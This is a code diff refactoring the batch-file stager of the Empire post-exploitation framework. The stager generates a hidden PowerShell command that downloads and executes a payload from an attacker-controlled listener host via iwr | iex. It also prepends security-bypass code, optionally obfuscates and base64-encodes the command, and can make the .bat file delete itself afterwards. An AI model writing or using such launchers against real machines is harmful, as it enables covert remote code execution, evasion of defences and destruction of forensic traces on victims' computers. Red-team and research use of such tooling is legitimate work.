@@ -2,6 +2,7 @@ from __future__ import print_function
 
 import logging
 from builtins import object
+from textwrap import dedent
 
 from empire.server.common.helpers import enc_powershell
 from empire.server.core.db import models
@@ -79,54 +80,61 @@ class Stager(object):
                 self.options[option]["Value"] = value
 
     def generate(self):
-        # extract all of our options
-        listener_name = self.options["Listener"]["Value"]
-        delete = self.options["Delete"]["Value"]
-        obfuscate = self.options["Obfuscate"]["Value"]
-        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
-        bypasses = self.options["Bypasses"]["Value"]
-        language = self.options["Language"]["Value"]
+        # Extract options
+        options = self.options
+        listener_name = options["Listener"]["Value"]
+        obfuscate_command = options["ObfuscateCommand"]["Value"]
+        bypasses = options["Bypasses"]["Value"]
+        language = options["Language"]["Value"]
 
-        if obfuscate.lower() == "true":
+        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
+        host = listener.options["Host"]["Value"]
+
+        if options["Obfuscate"]["Value"].lower() == "true":
             obfuscate = True
         else:
             obfuscate = False
 
-        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
-        host = listener.options["Host"]["Value"]
-        if host == "":
+        if options["Delete"]["Value"].lower() == "true":
+            delete = True
+        else:
+            delete = False
+
+        if not host:
             log.error("[!] Error in launcher command generation.")
             return ""
 
+        launcher = ""
         if listener.module in ["http", "http_com"]:
             if language == "powershell":
-                launcher = "powershell.exe -nol -w 1 -nop -ep bypass "
                 launcher_ps = f"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/')-UseBasicParsing|iex"
 
-                if obfuscate:
-                    launcher = "powershell.exe -nol -w 1 -nop -ep bypass -enc "
+                with SessionLocal.begin() as db:
+                    for bypass_name in bypasses.split(" "):
+                        bypass = (
+                            db.query(models.Bypass)
+                            .filter(models.Bypass.name == bypass_name)
+                            .first()
+                        )
 
-                    with SessionLocal.begin() as db:
-                        for bypass in bypasses.split(" "):
-                            bypass = (
-                                db.query(models.Bypass)
-                                .filter(models.Bypass.name == bypass)
-                                .first()
-                            )
-                            if bypass:
-                                if bypass.language == language:
-                                    launcher_ps = bypass.code + launcher_ps
-                                else:
-                                    log.warning(
-                                        f"Invalid bypass language: {bypass.language}"
-                                    )
+                        if bypass:
+                            if bypass.language == language:
+                                launcher_ps = bypass.code + launcher_ps
+                            else:
+                                log.warning(
+                                    f"Invalid bypass language: {bypass.language}"
+                                )
 
-                    launcher_ps = self.mainMenu.obfuscationv2.obfuscate(
+                launcher_ps = (
+                    self.mainMenu.obfuscationv2.obfuscate(
                         launcher_ps, obfuscate_command
                     )
-                    launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
+                    if obfuscate
+                    else launcher_ps
+                )
+                launcher_ps = enc_powershell(launcher_ps).decode("UTF-8")
+                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {launcher_ps}"
 
-                launcher = launcher + launcher_ps
             else:
                 oneliner = self.mainMenu.stagers.generate_exe_oneliner(
                     language=language,
@@ -135,28 +143,35 @@ class Stager(object):
                     encode=True,
                     listener_name=listener_name,
                 )
+                launcher = f"powershell.exe -nop -ep bypass -w 1 -enc {oneliner.split('-enc ')[1]}"
 
-                oneliner = oneliner.split("-enc ")[1]
-                launcher = f"powershell.exe -nol -w 1 -nop -ep bypass -enc {oneliner}"
-
-        else:
-            if language == "powershell":
-                launcher = self.mainMenu.stagers.generate_launcher(
-                    listenerName=listener_name,
-                    language="powershell",
-                    encode=True,
-                    obfuscate=obfuscate,
-                    obfuscation_command=obfuscate_command,
-                )
+        elif language == "powershell":
+            launcher = self.mainMenu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=True,
+                obfuscate=obfuscate,
+                obfuscation_command=obfuscate_command,
+            )
 
         if len(launcher) > 8192:
-            log.error("[!] Error launcher code is greater than 8192 characters.")
+            log.error("[!] Error: launcher code is greater than 8192 characters.")
             return ""
 
-        code = "@echo off\n"
-        code += "start " + launcher + "\n"
-        if delete.lower() == "true":
-            # code that causes the .bat to delete itself
-            code += '(goto) 2>nul & del "%~f0"\n'
+        code = dedent(
+            f"""
+            @echo off
+            start /B {launcher}
+            """
+        ).strip()
+
+        if delete:
+            code += "\n"
+            code += dedent(
+                """
+                timeout /t 1 > nul
+                del "%~f0"
+                """
+            ).strip()
 
         return code
